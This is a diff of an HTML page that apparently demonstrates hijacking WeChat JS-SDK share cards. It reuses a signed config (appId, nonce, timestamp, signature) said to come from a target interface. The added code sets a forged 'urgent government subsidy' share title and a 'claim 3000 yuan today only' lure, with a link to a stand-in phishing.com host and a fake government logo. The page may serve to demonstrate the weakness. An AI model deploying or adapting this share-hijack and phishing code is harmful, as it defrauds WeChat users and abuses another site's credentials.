@@ -2,43 +2,50 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>微信分享测试</title>
-    <!-- 微信官方 JSSDK -->
+    <title>测试页面</title>
     <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
 </head>
 <body>
-    <h1>测试页面</h1>
-
+    <h1>这是一个测试页面，分享时将被劫持</h1>
+    <button id="shareBtn">点击分享</button>
     <script>
-    var myconfig = {
-        "appId": "wx22dfc48d7b1a409c",
-        "nonceStr": "rDhwgbS1ex",
-        "timestamp": 1774848033,
-        "url": "https://guangguai.github.io/index.html",
-        "signature": "a56442ae3b3625840e9735e695f791d43b33d799"
-    };
+        // 从目标接口获取的数据
+        var wxConfig = {
+            debug: true,          // 开启调试，方便观察
+            appId: 'wx22dfc48d7b1a409c',
+            timestamp: 1774848033,
+            nonceStr: 'rDhwgbS1ex',
+            signature: 'a56442ae3b3625840e9735e695f791d43b33d799',
+            jsApiList: ['updateAppMessageShareData', 'updateTimelineShareData']
+        };
 
-    wx.config({
-        debug: false,
-        appId: myconfig.appId,
-        timestamp: myconfig.timestamp,
-        nonceStr: myconfig.nonceStr,
-        signature: myconfig.signature,
-        jsApiList: [
-            "updateAppMessageShareData",
-            "updateTimelineShareData"
-        ]
-    });
+        wx.config(wxConfig);
 
-    wx.ready(function () {
-        wx.updateAppMessageShareData({
-            title: "怒江职业技术学院官方通知",
-            desc: "校园通知·成绩查询·缴费入口",
-            link: "https://njzj.nujiang.cn",
-            imgUrl: "https://njzj.nujiang.cn/tpl/img/share.png",
-            success: function () {}
+        wx.ready(function() {
+            // 自定义分享到朋友圈
+            wx.updateTimelineShareData({
+                title: '【紧急】政府补贴发放通知',   // 伪造的标题
+                link: 'https://phishing.com/领取补贴', // 钓鱼链接
+                imgUrl: 'https://phishing.com/gov_logo.png', // 伪造图片
+                success: function() {
+                    console.log('朋友圈分享配置成功');
+                }
+            });
+            // 自定义分享给朋友
+            wx.updateAppMessageShareData({
+                title: '【紧急】政府补贴发放通知',
+                desc: '点击领取3000元补贴，仅限今日！',
+                link: 'https://phishing.com/领取补贴',
+                imgUrl: 'https://phishing.com/gov_logo.png',
+                success: function() {
+                    console.log('朋友分享配置成功');
+                }
+            });
         });
-    });
+
+        wx.error(function(res) {
+            console.error('wx.config 错误:', res);
+        });
     </script>
 </body>
 </html>
